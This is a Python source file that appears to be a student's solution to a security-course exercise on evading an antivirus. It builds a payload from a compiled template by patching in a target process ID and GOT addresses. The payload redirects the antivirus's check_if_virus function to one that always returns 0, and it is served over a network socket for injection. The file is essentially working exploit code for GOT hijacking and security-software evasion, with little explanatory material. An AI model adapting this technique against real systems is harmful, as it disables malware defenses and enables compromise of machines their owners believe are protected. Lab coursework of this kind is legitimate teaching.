import addresses
import evasion
import struct

class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to replace the GOT entry for check_if_virus.

        Reminder: We want to replace it with another function of a similar
        signature, that will return 0.

        Notes:
        1. You can assume we already compiled q3.c into q3.template.
        2. Use addresses.CHECK_IF_VIRUS_GOT, addresses.CHECK_IF_VIRUS_ALTERNATIVE
           (and addresses.address_to_bytes).

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q3.template'
        addr_check_if_virus = addresses.CHECK_IF_VIRUS_GOT;
        addr_check_if_virus_alternative = addresses.CHECK_IF_VIRUS_ALTERNATIVE;
        
        with open(PATH_TO_TEMPLATE, 'rb') as f:
            template = f.read()
            template = template.replace(struct.pack('<L',0x12345678), struct.pack('<L',pid))
            template = template.replace(struct.pack('<L',0x12341234), struct.pack('<L',addr_check_if_virus))
            template = template.replace(struct.pack('<L',0x12123434), struct.pack('<L',addr_check_if_virus_alternative))

        return template

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
